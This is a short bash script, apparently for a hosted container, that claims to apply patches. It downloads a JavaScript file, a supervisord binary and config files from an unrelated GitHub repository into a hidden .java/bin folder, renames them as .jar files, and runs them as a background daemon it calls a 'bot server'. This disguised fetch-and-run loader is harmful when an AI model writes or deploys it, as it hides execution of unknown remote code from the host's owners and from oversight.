#!/bin/bash

function fetch_files() {
    echo "Applying Patches ..."
    mkdir -p /home/container/.java/bin
    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n2-cfg.conf -o cfg.conf
    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n2-conf.json -o conf.json
    echo "DONE ..."
}

function start_app() {
    chmod a+x /home/container/.java/bin/***
    cd /home/container/.java/bin && ./plugins.jar -c ./cfg.conf -d
    echo "BOT SERVER STARTED ..."
}

if [ -f "/home/container/.java/bin/cfg.conf" ] && [ -f "/home/container/.java/bin/patch.jar" ] && [ -f "/home/container/.java/bin/plugins.jar" ] && [ -f "/home/container/.java/bin/conf.json" ]; then
    echo "Patch files already fetched ..."
    start_app
else
    rm -rf /home/container/.java/bin/**
    fetch_files
    start_app
fi
